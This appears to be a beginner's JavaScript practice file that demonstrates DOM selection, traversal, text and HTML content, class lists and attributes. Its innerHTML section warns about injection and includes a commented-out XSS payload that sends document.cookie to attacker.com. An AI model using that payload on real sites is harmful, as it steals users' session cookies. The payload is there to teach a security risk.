// TODO document.getElementbyId('id')

const mainContainer = document.getElementById('main-container');

mainContainer.style.backgroundColor = "lightblue";
mainContainer.style.border = "2px solid black";
mainContainer.style.padding = "10px";
mainContainer.style.height = "100vh";
console.log(mainContainer);
// TODO Puts a red border around the main div 

mainContainer.style.border = "5px solid red";
mainContainer.style.borderRadius = "10px";

const itemList = document.getElementById('item-list');
itemList.style.backgroundColor = "brown"
itemList.style.display = 'flex';
itemList.style.width = "100px"
itemList.style.height = "100px"
itemList.style.alignItems = 'center';
itemList.style.fontSize = "10px"
console.log(itemList);


// ! document.getElementsByTagName('tagName)

const allParagram = document.getElementsByTagName('p');
console.log(allParagram.length); 

//? You can loop throught the collection 
for(let i=0;i<allParagram.length;i++){
    allParagram[i].style.background = "lightgreen";
}


// ! document.getElementsByClassName('className');
 
const allItem = document.getElementsByClassName('item');

console.log(allItem.length); // 3 

//  ? You can also get elements with multiple classes 

const footerContainer = document.getElementsByClassName('container footer');
console.log(footerContainer[0]);


// ! document.querySelector();

//? Get the element with the ID 'main-container'
const main = document.querySelector('#main-container');

// ? Get the first element with the class 'container' 

const firstContainer = document.querySelector('.container');
console.log(firstContainer); // This is will be the main div, not the footer 

// Get the first paragraph 
const firstP = document.querySelector('p');
console.log(firstP);

// Get the list item that has "BOTH" item and special classes 

const specialItem = document.querySelector('.item.special');
// specialItem.style.color = 'orange';
console.log(specialItem);
// Get the input with the name 'username' 

const usernameInput = document.querySelector('input[name="username"]');
console.log(usernameInput);


// ! document.querySelectorAll();

// Get all elements with the class 'container'

const allContainers = document.querySelectorAll('.container');

console.log(allContainers.length);


// Get ALL list items inside the element with the ID 'item-list'
const listItems = document.querySelectorAll('#item-list li');

// A NodeList has a .forEach method, which is very convenient!
listItems.forEach(item => {
  item.style.fontWeight = 'bold';
});

// ! Other, More Niche Selections. 
const loginForm = document.getElementsByName('login-form');
const usernameInputByName = document.getElementsByName('username');


//TODO  Traversing the DOM 

const itemList2 = document.getElementById('item-list');
console.log(itemList2);
const parentContainer = itemList.parentElement; // The #main-container div
const listChildren = itemList.children; // An HTMLCollection of the 3 <li> elements
const firstLi = itemList.firstElementChild; // The first <li>
const lastLi = itemList.lastElementChild; // The last <li>

const specialLi = document.querySelector('.special');
// const nextItem2 = specialLi.nextElementSibling; // The 3rd <li>
// console.log(nextItem2)
// const prevItem = specialLi.previousElementSibling; // The 1st <li>

// ! .text Content 

const desc = document.getElementById('description');
console.log(desc.textContent);

// Output: "These headphones have noise-cancelling features."
// Notice the <strong> tags are gone.

const prductName = document.getElementById(`product-name`);
prductName.textContent = "Raju bhai kaise hai ";
console.log(prductName);
// Output: "Raju bhai kaise hai"
// It includes text from hidden elements but ignores comments.

const desc1 = document.getElementById('description');

// Let's try to inject some html 
desc1.textContent = "Click <a href='#' here </a> to win! ";
console.log(desc1);


// The browser will display the literal text, not a clickable link:
// "Click <a href='#'>here</a> to win!"



const desc3 = document.getElementById('description');
console.log(desc3.innerHTML);
// Output: "These headphones have <strong>noise-cancelling</strong> features."
// It includes the HTML tags as a string.


const desc4 = document.getElementById('description');

// This is powerful and useful for creating new elements.
desc4.innerHTML = "Updated features: <strong>Active Noise Cancelling</strong> and <em>Bluetooth 5.0</em>.";
// The browser will correctly render the bold and italic text.

// SECURITY RISK: What if the string comes from a malicious user?
let userInput = `<img src="x" onerror="alert('You have been hacked!')">`;
// desc.innerHTML = userInput; // This would execute the malicious script!
console.log(desc4)

{/* <img src="x" onerror="fetch('https://attacker.com?cookie=' + document.cookie)">
 */}


const productName = document.getElementById('product-name');
console.log(productName.innerText);
// Output: "SMART HEADPHONES" (if CSS `text-transform: uppercase` was applied)
// It will NOT include the text from the hidden <span> ("SALE").

const card2 = document.getElementById('product-card');
console.log(card2.id); // "product-card"
card2.id = 'new-card-id'; // Changes the element's ID

console.log(card2.className); // "card featured"

// This will OVERWRITE all existing classes.
card2.className = "card-dark-mode";
// The element now only has the class "card-dark-mode". "featured" is gone.

const card21 = document.getElementById('product-card');

card21.classList.add('in-cart');      // Adds 'in-cart'
card21.classList.remove('featured'); // Removes 'featured'

// Toggle a 'selected' class every time a function is called
card2.classList.toggle('selected');

if (card2.classList.contains('in-cart')) {
  console.log("This item is in the cart.");
}

const card3 = document.getElementById('product-card');

// Add a custom data attribute
card3.setAttribute('data-product-id', 'xyz-123');

// Get the value of an attribute
const productId = card3.getAttribute('data-product-id');
console.log(productId); // "xyz-123"

// Remove an attribute
card3.removeAttribute('class');

const title = document.querySelector('.title');

title.style.color = 'blue';
title.style.backgroundColor = '#f0f0f0'; // Note the camelCase
title.style.fontSize = '24px'; // The value must be a string
title.style.padding = '10px';

